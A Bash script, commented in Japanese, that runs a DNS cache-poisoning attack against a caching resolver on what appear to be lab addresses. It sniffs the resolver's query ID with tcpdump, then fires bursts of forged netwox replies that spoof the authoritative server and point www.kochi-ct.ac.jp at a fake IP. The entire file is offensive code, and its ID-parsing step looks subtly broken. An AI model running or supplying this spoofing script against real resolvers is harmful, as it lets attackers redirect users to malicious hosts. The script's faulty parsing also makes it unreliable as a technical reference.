#!/bin/bash
# dns_spoof_direct.sh
# Ubuntu22.04 + netwox105 直接送信版

CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"    # 権威DNSサーバ（送信元を偽装）
FAKE_IP="192.168.56.104"     # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"  # ターゲットドメイン
TTL="300"                    # 偽応答TTL
BURST_COUNT=100              # 偽応答の連射数

echo "[*] 攻撃開始: ${DOMAIN} → ${FAKE_IP}"
echo "[*] キャッシュDNS(${CACHE_DNS})が権威DNS(${AUTH_DNS})へ問い合わせたら偽応答を送信します"

while true; do
    RAW_TXID=$(sudo tcpdump -n -i any -c 1 "udp and src ${CACHE_DNS} and port 53" -vv -XX \
        | grep -A1 "0x0000:" \
        | tail -n1 \
        | awk '{print $1$2}')

    TXID="0x${RAW_TXID}"
    echo "[+] TXID取得成功: ${TXID}"

    echo "[*] 偽応答を ${BURST_COUNT} 通送信中..."
    for ((i=1; i<=BURST_COUNT; i++)); do
        sudo netwox 105 \
            -d $CACHE_DNS \
            -D 53 \
            -s $AUTH_DNS \
            -S 53 \
            -q $TXID \
            -n $DOMAIN \
            -a $FAKE_IP \
            -A 1 \
            -T $TTL \
            >/dev/null 2>&1 &
    done

    wait
    echo "[+] 偽応答送信完了"

    echo "[*] 次の問い合わせを待機中..."
done
